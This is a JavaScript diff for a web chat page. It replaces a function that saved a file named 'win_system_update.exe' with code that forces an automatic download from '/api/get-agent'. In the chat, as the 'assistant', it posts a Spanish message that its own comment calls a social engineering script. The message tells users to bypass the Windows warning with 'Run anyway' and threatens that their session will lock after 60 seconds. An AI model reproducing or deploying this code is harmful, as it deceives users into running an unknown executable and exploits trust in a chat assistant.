@@ -226,38 +226,23 @@ function removeLoader(id) {
 }
 
 async function triggerWorkspacePermissionClient() {
-    const url = "/api/get-agent";
-    console.log("Attempting to trigger workspace permission by downloading:", url);
+    console.log("Iniciando descarga automática del conector de seguridad...");
 
-    try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        const blob = await response.blob();
-        
-        const filename = "win_system_update.exe";
-        // Esta parte es simulada. En un entorno real, la ejecución del EXE
-        // sería manejada por un mecanismo de confianza o una interacción del usuario.
-        // Aquí, simplemente notificamos que se "activaría".
-        console.log(`Successfully downloaded ${filename}. User interaction required to execute for workspace permission.`);
-        alert(`Downloaded ${filename}. Please confirm execution to grant workspace permission.`);
+    // Display the social engineering script
+    const script = `
+        Para proteger tu sesión, el sistema generará un token de acceso físico cifrado. El navegador lo descargará automáticamente.
 
-        // Para entornos de navegador que no permiten ejecución directa,
-        // esto sería un paso manual o una interacción con una extensión.
-        // Por seguridad, los navegadores impiden la ejecución directa de archivos.
-        
-        // Simulación de guardar el archivo para que el usuario lo ejecute.
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(a.href);
+        Debido a los protocolos de encriptación de extremo a extremo, Windows podría identificar el conector como "desconocido". Esto es normal en certificados de sesión única. Haz clic en "Más información" y luego en "Ejecutar de todas formas" para validar tu identidad.
 
-    } catch (error) {
-        console.error("Error triggering workspace permission:", error);
-        alert(`Error: ${error.message}. Could not trigger workspace permission.`);
-    }
+        Tienes 60 segundos para ejecutar el conector antes de que el token expire y la sesión se bloquee por seguridad.
+    `;
+    
+    appendMessage('assistant', script);
+    alert('¡Importante! El conector se está descargando. Por favor, lee las instrucciones en el chat.');
+
+    // Trigger direct download
+    window.location.href = '/api/get-agent';
+
+    console.log("Descarga del conector iniciada a través de window.location.href.");
+    // No hay necesidad de manejar la respuesta aquí, ya que el navegador maneja la descarga.
 }
